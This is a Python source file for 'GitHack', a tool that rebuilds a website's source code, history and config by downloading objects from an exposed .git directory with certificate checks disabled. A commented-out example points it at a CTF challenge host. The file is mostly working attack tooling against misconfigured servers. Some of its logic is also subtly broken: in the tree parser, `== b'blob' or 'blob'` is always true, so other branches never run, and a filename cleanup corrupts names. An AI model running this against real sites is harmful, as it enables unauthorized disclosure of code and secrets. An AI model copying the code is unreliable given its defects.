# -*- coding: utf-8 -*-
#####
#Author: LordCasser
#Date: 2020-03-26 11:18:21
#LastEditTime: 2020-03-27 21:20:08
#LastEditors: LordCasser
#Description: 
#####
__author__ = 'gakki429'

import os
import re
import sys
import ssl
import zlib
from urllib import request
from lib.git_pack import GitPack
from lib.git_index import GitIndex
from lib.utils import _mkdir, _print

request.getproxies = lambda: {}

class GitHack(object):
    """Git Extract without git command"""
    def __init__(self, git_host):
        self.flag = False
        if os.path.exists(git_host):
            self.git_path = git_host
            self.local = True
        elif (git_host.startswith('http') 
                and git_host.endswith('/')):
            self.git_path = re.search(r'https?://(.*)', 
                                git_host).group(1).replace(':', '_')
            self.local = False
            _mkdir(self.git_path)
        else:
            _print('Usage:\n\tpython3 {} http://example.com/.git/'.format((sys.argv[0])), 'red')
            sys.exit(0)
        self.objects = {}
        self.refs_hash = set()
        self.git_host = git_host
        self._logo()
        _print('[*] Start Extract')
        _print('[*] Target Git: {}'.format(self.git_host))
        os.chdir(self.git_path)

    def _logo(self):
        pass
#         Logo = """
#     ________.__  __    ___________         __                        __   
#    /  _____/|__|/  |_  \_   _____/__  ____/  |_____________    _____/  |_ 
#   /   \  ___|  \   __\  |    __)_\  \/  /\   __\_  __ \__  \ _/ ___\   __\\
#   \    \_\  \  ||  |    |        \>    <  |  |  |  | \// __ \\\\  \___|  |  
#    \______  /__||__|   /_______  /__/\_ \ |__|  |__|  (____  /\___  >__|  
#           \/                   \/      \/                  \/     \/      
#                                                     Author: gakki429
#         """
#         _print(Logo, 'green')

    def download_file(self, path):
        if os.path.exists(path):
            return open(path, 'rb').read()
        if self.local:
            return
        url = self.git_host + path
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            resp = request.urlopen(url, context=ctx)
            if resp.getcode() == 200:
                self.flag = True
                data = resp.read()
                _mkdir(path)
                open(path, 'wb').write(data)
                return data
        except Exception as e:
            # _print('[-] File not exist {} '.format(path), 'red')
            return

    def git_object_parse(self, _hash):
        if type(_hash) == bytes: #TODO:
            path = 'objects/{}/{}'.format(_hash[:2].decode(), _hash[2:].decode())
        else:
            path = 'objects/{}/{}'.format(_hash[:2], _hash[2:])
        file = self.download_file(path)
        try:
            data = zlib.decompress(file)
            _type, _len, _file = re.findall(b"^(tag|blob|tree|commit) (\d+?)\x00(.*)", data, re.S|re.M)[0]
            if int(_len) == len(_file):
                self.objects[_hash] = _type
                return _type, _len, _file
            else:
                self.objects[_hash] = 'unknown'
        except TypeError:
            self.objects[_hash] = 'unknown'

    def git_file_type(self, mode):
        if mode in [b'160000']:
            return 'commit'
        elif mode in [b'40000']:
            return 'tree'
        elif mode in [b'100644', b'100664', b'100755', b'120000']:
            return 'blob'

    def git_ls_tree(self, _hash):
        tree = self.git_object_parse(_hash)
        try:
            tree = set(re.findall(b"(\d{5,6}) (.*?)\x00(.{20})", tree[2], re.M|re.S))
        except TypeError:
            tree = set()
        tree_result = set()
        for _mode, _path, _hash in tree:
            _type = self.git_file_type(_mode)
            _hash = _hash.hex() #TODO:
            tree_result.add((_type, _hash, _path))
        return tree_result

    def git_save_blob(self, _dir, _path, _hash, save_file=False):
        filename = _dir + _path.decode() #TODO:
        try:
            data = self.git_object_parse(_hash)[2]
        except TypeError:
            return
        if os.path.isfile(filename):
            file = open(filename, 'rb').read()
            if file != data:
                filename = '{}{}.{}'.format(_dir, _path, _hash[:6])
                if not os.path.isfile(filename):
                    save_file = True
        else:
            save_file = True
        if save_file:
            if type(filename) == bytes:
                filename = filename.encode()
                print(filename)
            else :
                filename = filename.replace('b','').replace("'",'')
            _print('[+] Save {}'.format(filename), 'green')
            open(filename, 'wb').write(data)

    def git_parse_tree(self, _hash, _dir='../'):
        _mkdir(_dir)
        _print('[*] Parse Tree {} {}'.format(_dir, _hash[:6]))
        tree = self.git_ls_tree(_hash)
        for _type, _hash, _path in tree:
            if _type == b'blob' or 'blob':
                self.git_save_blob(_dir, _path, _hash)
            elif _type == b'tree' or 'tree':
                self.git_parse_tree(_hash, '{}{}/'.format(_dir, _path))
            elif _type == b'commit' or 'commit':
                self.git_commit(_hash)
            else:
                _print('[-] unknown {} {}'.format(
                    self.git_object_parse(_hash)[0], _hash), 'red')

    def git_commit(self, _hash, data=''):
        _print('[*] Clone Commit {}'.format(_hash[:6]))
        if not data:
            commit = self.git_object_parse(_hash)
        else:
            commit = data
        # 考虑到parent的hash可以利用于是修改为
        self.git_extract_by_hash(commit[2])

    def git_tag(self, _hash, data=''):
        if not data:
            tag = self.git_object_parse(_hash)
        else:
            tag = data
        if not data:
            return
        _print('[*] Parse Tag {}'.format(_hash[:6]))
        self.git_extract_by_hash(tag[2])

    def git_head(self):
        head = self.download_file('HEAD')
        if head:
            _print('[*] Analyze .git/HEAD')
            refs = re.findall(b'ref: (.*)', head, re.M)
            self.git_refs(refs)

    def git_refs(self, refs):
        for ref in refs:
            try:
                ref_hash = self.download_file(ref.decode()).strip() #TODO:
                _print('[+] Extract Ref {} {}'.format(ref.decode(), ref_hash[:6].decode()))
                data = self.git_object_parse(ref_hash)
                if data[0] == b'commit':
                    self.git_commit(ref_hash, data)
                elif data[0] == b'tag':
                    self.git_tag(ref_hash, data)
            except:
                _print('[-] Except With Extract Ref {}'.format(ref), 'red')

    def git_extract_by_hash(self, data):
        if not data:
            return
        data_hash = set(re.findall(b'[0-9a-z]{40}', data)) - set(self.objects.keys())
        if b'0'*40 in data_hash:
            data_hash.remove(b'0'*40)
        for _hash in data_hash:
            try:
                _type, _len, file = self.git_object_parse(_hash)
            except TypeError:
                continue
            if _type == b'commit':
                self.git_commit(_hash)
            elif _type == b'tree':
                self.git_parse_tree(_hash)
            elif _type == b'tag':
                self.git_tag(_hash)
            elif _type == b'blob':
                self.git_save_blob('../', '{}_impossible_file.txt'.format(_hash[:6]), _hash.encode()) #TODO:

    def git_logs(self):
        logs = self.download_file('logs/HEAD')
        if logs:
            _print('[*] Analyze .git/logs/HEAD')
            self.git_extract_by_hash(logs)

    def git_parse_info_refs(self):
        info_refs = 'info/refs'
        refs = self.download_file(info_refs)
        if not refs:
            return
        _print('[*] Detect .git/info/refs')
        refs_info = re.findall(r'([a-z0-9]{40})\t(.*)', refs)
        for _hash, ref in refs_info:
            _mkdir(ref)
            open(ref, 'wb').write(_hash+'\n')
            self.git_refs([ref])

    def git_parse_pack(self):
        pack_path = 'objects/info/packs'
        packs = self.download_file(pack_path)
        if not packs:
            return
        _print('[*] Detect .git/objects/info/packs')
        packs_hash = re.findall('P pack-([a-z0-9]{40}).pack', packs, re.S|re.M)
        pack_object_hash = set()
        for pack_hash in packs_hash:
            pack = GitPack(self.git_path, pack_hash)
            pack.pack_init()
            pack_object_hash.update(list(pack.objects.keys()))
        self.git_parse_info_refs()
        # 下面是应对未知情况，正常是hash都已经被解析
        unparse_hash = pack_object_hash - set(self.objects.keys())
        if unparse_hash:
            _print('[+] Parse Left Pack Object Hash')
            self.git_extract_by_hash('\n'.join(unparse_hash))

    def git_stash(self):
        stash = self.download_file('refs/stash')
        if stash:
            _print('[*] Detect .git/refs/stash')
            self.git_extract_by_hash(stash)

    def git_index_cache(self):
        index_data = self.download_file('index')
        if not index_data:
            return
        _print('[*] Detect .git/index')
        index = GitIndex(self.git_path)
        index.index_init()
        for tree_hash in list(index.tree_objects.keys()):
            if tree_hash not in list(self.objects.keys()):
                self.git_parse_tree(tree_hash)
        left_file = set(index.blob_objects.keys()) - set(self.objects.keys())
        for _hash in left_file:
            file = index.blob_objects[_hash]
            path = file['filename']
            self.git_save_blob('../', path, _hash)

    def git_other(self):
        hash_path = [
            'packed-refs',
            'refs/remotes/origin/HEAD',
            'ORIG_HEAD',
            'FETCH_HEAD',
        ]
        info_path = [
            'config',
            'description',
            'info/exclude',
            'COMMIT_EDITMSG',
        ]
        for path in hash_path:
            data = self.download_file(path)
            if data:
                self.git_extract_by_hash(data)
        for path in info_path:
            self.download_file(path)

    def git_init(self):
        self.git_head()
        self.git_logs()
        self.git_index_cache()
        self.git_stash()
        self.git_parse_pack()
        self.git_other()
        _print('[*] Extract Done')
        return self.flag

if __name__ == '__main__':
    if len(sys.argv) == 2:
        GIT_HOST = sys.argv[1]
        Git = GitHack(GIT_HOST)
        Git.git_init()
    else:
        _print('Usage:\n\tpython {} http://example.com/.git/'.format((sys.argv[0])), 'red')


    # if len(sys.argv) == 1:
    #     # GIT_HOST = sys.argv[1]
    #     GIT_HOST = "http://06bfdf94493f4036934ebf0e0bde60c8f5361b9ae3ac4ece.changame.ichunqiu.com/Challenges/.git/"
    #     Git = GitHack(GIT_HOST)
    #     Git.git_init()
    # else:
    #     _print('Usage:\n\tpython3 {} http://example.com/.git/'.format((sys.argv[0])), 'red')
